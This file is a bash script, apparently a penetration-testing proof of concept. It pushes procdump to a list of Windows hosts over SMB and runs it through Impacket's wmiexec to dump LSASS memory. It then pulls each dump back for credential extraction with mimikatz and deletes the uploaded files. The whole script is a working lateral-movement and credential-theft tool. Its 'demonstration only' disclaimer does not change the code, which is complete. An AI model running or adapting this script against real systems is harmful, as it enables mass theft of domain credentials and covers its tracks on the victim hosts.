#!/usr/bin/env bash

##################################################################
#                                                                #
# Script to push procdump to host, dump LSASS, and               #
# retrieve dump in order to process with mimikatz locally.       #
#                                                                #
# Don't use this script. It'll probably DoS everything.          #
#                                                                #
# Requirements: smbclient, Impacket's wmiexec.py, procdump64.exe #
#                                                                #
# Notes:                                                         #
#        - Hardcode location of smbclient and Impacket's         #
#          wmiexec.py                                            #
#        - Create a target list of valid hosts, separated by     #
#          newline. (Can create with "nmap -p 445" and parsing   #
#          out the host ip addresses)                            #
#        - PoC only set up for 64 bit. You're welcome to change  #
#          the wmic flags if you're hitting a 32bit system.      #
#        - PoC assumes share is C$. Change if you like.          #
#                                                                #
# Written by Tinker. For Demonstration Purposes Only.            #
#                                                                #
##################################################################

# Script assumes both smbclient and Impacket's wmiexec.py is in your PATH or in the current working directory.
# Script assumes that procdump64.exe is in your current working directory.
# Change the below variables if you need to direct to a tool's full path.
SMBCLIENT=smbclient
WMIEXEC=wmiexec.py
#WMIEXEC=/full/path/to/impacket/examples/wmiexec.py
PROCDUMP=procdump64.exe

USAGE="
Bash script to upload procdump to remote host, dump memory on the remote host, and then download that dump back to the local host.

Flags:
  -u	Username (requires Local Administrator privileges)
  -p	Password
  -d	Domain (use a dot "." for host based authentication)
  -f  File containing IP Addresses or Hostnames of targets. Separated by newline.
  -h	Help text and usage example.

usage:	 grabDump.sh -d <domain> -u <username> -p <password> -f <file of target hosts>
example: grabDump.sh -d GIBSON -u zerocool -p hunter2 -f hostlist.txt
example: grabDump.sh -d . -u Administrator -p Welcome -f hostlist.txt
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
	echo "$USAGE"
	exit
fi

# Set flags.
while getopts "u:p:d:f:h" FLAG
do
	case $FLAG in
		u)
			USERNAME=$OPTARG
			;;
		p)
			PASSWORD=$OPTARG
			;;
		d)
			DOMAIN=$OPTARG
			;;
		f)
			if [ ! -f $OPTARG ]; then
				echo "File not found: $1"
				exit 1
			else
				HOSTFILE=$OPTARG
			fi
			;;
		h)	echo "$USAGE"
			exit
			;;
		*)
			echo "$USAGE"
			exit
			;;
	esac
done

# Make sure each required flag was actually set.
if [ -z ${USERNAME+x} ]; then
	echo "Username flag (-u) is not set."
	echo "$USAGE"
	exit
elif [ -z ${PASSWORD+x} ]; then
	echo "Password flag (-p) is not set."
	echo "$USAGE"
	exit
elif [ -z ${DOMAIN+x} ]; then
	echo "User domain flag (-f) is not set."
	echo "$USAGE"
	exit
elif [ -z ${HOSTFILE+x} ]; then
	echo "Hostfile flag (-g) is not set."
	echo "$USAGE"
	exit
fi

# Push it. Dump it. Get it. Remove it.
for TARGETIP in `cat $HOSTFILE`
do
	echo "===| Connecting to $TARGETIP and uploading $PROCDUMP! |==="
	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "put $PROCDUMP procdump.exe"
	echo
	echo "===| Dumping memory on $TARGETIP! |==="
	python $WMIEXEC "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGETIP" 'procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp'
	echo
	echo "===| Retrieving the dump... Muh dumps, muh dumps. Muh lovely LSASS dumps! |==="
	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "get lsass.dmp lsass-$TARGETIP.dmp"
	echo
	echo "===| Check it out! |==="
        echo "> DUMP SAVED IN CURRENT FOLDER AS: lsass-$TARGETIP.dmp"
	echo
	echo "===| And... Cleaning up! |==="
	$SMBCLIENT \\\\"$TARGETIP"\\C$ -U "$USERNAME" -W "$DOMAIN" "$PASSWORD" -c "rm procdump.exe;rm lsass.dmp"
	echo
	echo
done
